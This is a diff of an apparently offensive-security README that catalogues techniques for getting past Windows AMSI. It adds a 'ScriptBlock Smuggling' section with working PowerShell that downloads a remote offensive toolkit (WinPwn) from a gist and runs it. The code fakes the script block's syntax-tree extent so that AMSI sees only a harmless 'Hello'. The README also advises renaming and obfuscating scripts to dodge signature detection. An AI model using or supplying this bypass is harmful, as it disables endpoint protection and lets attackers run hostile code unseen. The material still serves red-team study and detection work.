@@ -7,27 +7,47 @@ This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance met
 
 Most of the scripts are detected by AMSI itself. So you have to find the [trigger](https://github.com/RythmStick/AMSITrigger) and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime. Alternatively obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working. You can also take a look at my [blog post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about manually changing the signature to get a valid bypass again.
 
-0. [Using Hardware Breakpoints](#Using-Hardware-Breakpoints "Goto Using-Hardware-Breakpoints")
-1. [Using CLR hooking](#Using-CLR-hooking "Goto Using-CLR-hooking")
-2. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
-3. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
-4. [Patching AMSI AmsiScanBuffer by rasta-mouse](#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse "Goto Patching-AMSI-AmsiScanBuffer-by-rasta-mouse")
-5. [Patching AMSI AmsiOpenSession](#Patching-AMSI-AmsiOpenSession "Goto Patching-AMSI-AmsiOpenSession")
-6. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
-7. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
-8. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
-9. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
-10. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
-11. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
-12. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
-13. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
-14. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
-15. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
-16. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
-17. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
-18. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
-19. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
-20. [Patching the AmsiScanBuffer address in System.Management.Automation.dll](#Patching-AmsiScanBuffer-Address "Goto Patching-AmsiScanBuffer-Address")
+0. [ScriptBlock Smuggling](#ScriptBlock-Smuggling "Goto ScriptBlock-Smuggling")
+1. [Using Hardware Breakpoints](#Using-Hardware-Breakpoints "Goto Using-Hardware-Breakpoints")
+2. [Using CLR hooking](#Using-CLR-hooking "Goto Using-CLR-hooking")
+3. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
+4. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
+5. [Patching AMSI AmsiScanBuffer by rasta-mouse](#Patching-AMSI-AmsiScanBuffer-by-rasta-mouse "Goto Patching-AMSI-AmsiScanBuffer-by-rasta-mouse")
+6. [Patching AMSI AmsiOpenSession](#Patching-AMSI-AmsiOpenSession "Goto Patching-AMSI-AmsiOpenSession")
+7. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
+8. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
+9. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
+10. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
+11. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
+12. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
+13. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+14. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+15. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+16. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
+17. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
+18. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
+19. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+20. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+21. [Patching the AmsiScanBuffer address in System.Management.Automation.dll](#Patching-AmsiScanBuffer-Address "Goto Patching-AmsiScanBuffer-Address")
+
+# ScriptBlock Smuggling
+- Original technique from [Hubbl3](https://x.com/_Hubbl3)
+- Explained here [ScriptBlockSmuggling](https://bc-security.org/scriptblock-smuggling/)
+
+```powershell
+$c = (new-Object net.webclient).downloadstring('https://gist.githubusercontent.com/S3cur3Th1sSh1t/2f4d37fde889af8f02b287db84f8ec4b/raw/0e2823c209fb7ca85f1aa3d0a0ab9c7871ef97bd/winpwn.ps1')
+$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
+$ExecutedAst = [ScriptBlock]::Create("$c").Ast
+$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
+                                                                   $null,
+                                                                   $null,
+                                                                   $null,
+                                                                   $ExecutedAst.EndBlock.Copy(),
+                                                                   $null)
+$Sb = $Ast.GetScriptBlock()
+# Any function - such as in this case WinPwn - that you want to be executed must be already called in the Scriptblock on the remote webserver. Fun fact, scripts that are loaded by the Script itself via iex(new-object net.webclient) also bypass AMSI.
+& $Sb
+```
 
 # Using Hardware Breakpoints
 - Original technique from @_EthicalChaos_ (https://twitter.com/_EthicalChaos_)
